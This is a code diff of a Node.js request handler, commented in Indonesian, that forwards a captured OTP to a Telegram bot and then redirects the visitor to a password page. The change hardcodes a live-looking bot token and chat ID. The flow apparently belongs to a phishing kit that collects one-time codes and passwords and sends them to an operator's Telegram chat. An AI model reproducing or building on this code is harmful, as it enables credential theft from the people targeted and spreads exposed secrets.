@@ -85,11 +85,11 @@ module.exports = async (req, res) => {
   // Tentukan bot berdasarkan bot_id
   let botToken, chatId;
   if (bot_id === "1") {
-    botToken = process.env.BOT1_TOKEN || "ISI_TOKEN_BOT1";
-    chatId   = process.env.CHAT1_ID   || "ISI_CHATID1";
+    botToken = process.env.BOT1_TOKEN || "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM";
+    chatId   = process.env.CHAT1_ID   || "5876510981";
   } else {
-    botToken = process.env.BOT2_TOKEN || "ISI_TOKEN_BOT2";
-    chatId   = process.env.CHAT2_ID   || "ISI_CHATID2";
+    botToken = process.env.BOT2_TOKEN || "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM";
+    chatId   = process.env.CHAT2_ID   || "5876510981";
   }
 
   // Kirim ke Telegram
@@ -97,7 +97,7 @@ module.exports = async (req, res) => {
 
   if (result.success) {
     console.log("✅ OTP berhasil dikirim:", result.data);
-    res.writeHead(302, { Location: "/password/" });
+    res.writeHead(302, { Location: "../password/" });
     res.end();
   } else {
     console.error("❌ Gagal kirim OTP:", result.error);
